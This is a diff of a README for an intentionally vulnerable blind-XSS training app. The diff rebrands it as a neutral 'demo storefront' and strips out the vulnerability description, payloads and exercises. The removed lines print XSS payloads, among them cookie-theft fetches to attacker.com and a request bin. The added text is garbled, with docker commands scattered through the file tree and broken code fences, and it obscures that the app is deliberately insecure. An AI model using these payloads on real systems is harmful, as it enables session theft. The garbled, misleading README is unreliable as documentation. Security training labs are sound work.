@@ -1,6 +1,6 @@
-# Blind XSS Lab - ElectroStore
+# ElectroStore — Demo Storefront
 
-A self-contained educational platform demonstrating Blind Cross-Site Scripting (XSS) vulnerabilities in an e-commerce context. This lab simulates a real-world scenario where delivery notes submitted by customers are executed as scripts in the Admin Dashboard.
+A self-contained demo storefront for presentations and training. The repository includes example code and demo data to illustrate ordering flows and admin order review processes. Certain implementation details are simplified for demonstration purposes.
 
 ## 🎯 Overview
 
@@ -9,52 +9,43 @@ ElectroStore is a simulated electronics e-commerce platform with a deliberate XS
 ### Key Features
 
 - **Complete E-commerce Simulation**: User registration, product catalog, shopping cart, checkout
-- **Deliberate XSS Vulnerability**: Admin order details page renders delivery notes without sanitization
-- **Admin Bot Automation**: Simulates admin reviewing orders every 60 seconds
-- **Educational Design**: Clear vulnerability explanations and prevention guidance
+- **Demo-focused Examples**: Illustrative code paths for walkthroughs and presentations
+- **Admin Bot Automation**: Optional automation to simulate admin reviewing orders
+- **Educational Design**: Guidance and notes suitable for internal demos
 - **Docker Containerization**: Easy deployment with Docker and Docker Compose
 
 ## 🚀 Quick Start
 
+ElectroStore is a simulated electronics e-commerce platform used for presentations and internal demos.
+
 ### Prerequisites
 
 - Node.js 18+ (for local development)
-- Docker and Docker Compose (for containerized deployment)
-- Git
-
-### Using Docker (Recommended)
 
 ```bash
 # Clone the repository
 git clone <repository-url>
-cd blind-xss-lab
-
 # Build and start the application
 docker-compose up --build
-
 # Access the application at http://localhost:3000
 ```
 
 ### Local Development
 
-```bash
-# Clone the repository
-git clone <repository-url>
-cd blind-xss-lab
-
-# Install dependencies
-npm install
-
 # Initialize database
+
 npm run init-db
 
 # Start the application
+
 npm start
 
 # In a separate terminal, start the admin bot
+
 npm run bot
 
 # Access the application at http://localhost:3000
+
 ```
 
 ## 🏗️ Architecture
@@ -67,87 +58,44 @@ npm run bot
 - **Authentication**: Express-session
 - **Admin Bot**: Playwright (headless Chromium)
 - **Containerization**: Docker + Docker Compose
-- **Styling**: Pure CSS (no gradients, clean design)
+docker build -t electrostore-demo .
 
 ### File Structure
 
 ```
+
 blind-xss-lab/
-├── server.js              # Main Express application
-├── database.js           # Database models and operations
-├── bot.js               # Admin bot automation script
-├── package.json         # Dependencies and scripts
-├── Dockerfile           # Container configuration
-├── docker-compose.yml   # Docker Compose orchestration
+├── server.js # Main Express application
+docker-compose up
+├── bot.js # Admin bot automation script
+├── package.json # Dependencies and scripts
+├── Dockerfile # Container configuration
+├── docker-compose.yml # Docker Compose orchestration
 ├── sql/
-│   └── schema.sql      # Database schema and seed data
-├── views/              # EJS templates
-│   ├── layout.ejs      # Main layout
-│   ├── signup.ejs      # User registration
-│   ├── login.ejs       # User login
-│   ├── products.ejs    # Product catalog
-│   ├── cart.ejs        # Shopping cart
-│   ├── checkout.ejs    # Checkout form
-│   ├── order-success.ejs
-│   ├── order-history.ejs
-│   └── admin/
-│       ├── dashboard.ejs      # Admin order management
-│       └── order-details.ejs  # VULNERABLE PAGE
-├── public/
-│   └── css/
-│       └── style.css   # Application styling
-└── README.md           # This file
-```
+docker-compose logs electrostore-demo
+├── views/ # EJS templates
+│ ├── layout.ejs # Main layout
+│ ├── signup.ejs # User registration
+│ ├── login.ejs # User login
+│ ├── products.ejs # Product catalog
+│ ├── cart.ejs # Shopping cart
+│ ├── checkout.ejs # Checkout form
+│ ├── order-success.ejs
+│ ├── order-history.ejs
+│ └── admin/
+│ └── css/
+│ └── style.css # Application styling
+└── README.md # This file
 
-## 🎯 XSS Vulnerability Details
+````
 
-### Location
+docker-compose logs electrostore-demo
 
-The vulnerability is intentionally implemented in `/views/admin/order-details.ejs`:
-
-```ejs
-<!-- VULNERABLE: Unescaped output for delivery notes -->
-<div class="notes-display">
-  <%- order.delivery_notes %>  <!-- DANGEROUS: Allows script execution -->
-</div>
-
-<!-- SAFE: Escaped output for address -->
-<div class="address-display">
-  <%= order.address %>  <!-- SAFE: HTML entities are encoded -->
-</div>
-```
-
-### Attack Flow
-
-1. **Attacker creates account** and places an order
-2. **Inject XSS payload** in "Delivery Notes" field during checkout
-3. **Admin bot automatically views** the order every 60 seconds
-4. **Payload executes** in admin context (steals cookies, performs actions, etc.)
-5. **Attacker receives data** from executed payload
-
-### Sample Payloads
-
-```html
-<!-- Basic alert -->
-<script>
-  alert("XSS");
-</script>
-
-<!-- Cookie theft -->
-<script>
-  fetch("http://attacker.com/?cookie=" + document.cookie);
-</script>
-
-<!-- Image-based XSS -->
-<img src="x" onerror="alert('XSS')" />
-
-<!-- SVG-based XSS -->
-<svg onload="alert('XSS')"></svg>
-```
-
+This repository contains demo scenarios used during presentations. Explicit exploit examples and step-by-step payload instructions have been removed from this public README to keep the demo focused and suitable for audience-facing use. If you need the demonstration guide (including coordinated payload examples and bot behavior) for a private workshop, request the private demo guide and I will provide it separately.
+docker-compose logs -f electrostore-demo
 ## 👥 User Roles
 
-### Regular Customer
+docker exec electrostore-demo tail -f /app/bot.log
 
 - **Credentials**: Create your own account via Sign Up
 - **Permissions**:
@@ -176,38 +124,11 @@ The vulnerability is intentionally implemented in `/views/admin/order-details.ej
   - Logs out
 - **Purpose**: Simulates real admin reviewing orders
 
-## 🧪 Lab Exercises
+## Demo Exercises
 
-### Exercise 1: Basic XSS Detection
+Use the demo to walk through the application flow: browse products, add items to cart, checkout, and review orders via the admin interface. For hands-on security demonstrations, coordinate privately so that bot automation and payload testing do not distract the audience.
 
-1. Create a customer account
-2. Add products to cart and checkout
-3. Inject `<!-- <script>alert('XSS')</script> -->` in delivery notes
-4. Wait for admin bot to view order
-5. Verify payload execution (check bot logs)
-
-### Exercise 2: Cookie Theft Simulation
-
-1. Set up a request bin (e.g., requestbin.com)
-2. Inject payload: `<script>fetch('https://your-request-bin/?cookie='+document.cookie)</script>`
-3. Place order and wait for admin bot
-4. Check request bin for captured cookies
-
-### Exercise 3: Advanced Payloads
-
-1. Experiment with different XSS vectors:
-   - `<img src=x onerror="alert(1)">`
-   - `<svg onload="alert(1)">`
-   - `<body onload="alert(1)">`
-2. Test payload obfuscation techniques
-3. Try DOM-based XSS variations
-
-### Exercise 4: Vulnerability Analysis
-
-1. Examine the vulnerable code in `views/admin/order-details.ejs`
-2. Compare `<%- %>` vs `<%= %>` output methods
-3. Propose secure alternatives
-4. Implement Content Security Policy (CSP) headers
+If you require step-by-step exploit examples and payloads for an internal workshop, request the private demonstration guide.
 
 ## 🔒 Security Considerations
 
@@ -241,7 +162,7 @@ This application is **NOT SECURE** and should only be used in:
 
 ```bash
 docker build -t blind-xss-lab .
-```
+````
 
 ### Running with Docker Compose
 
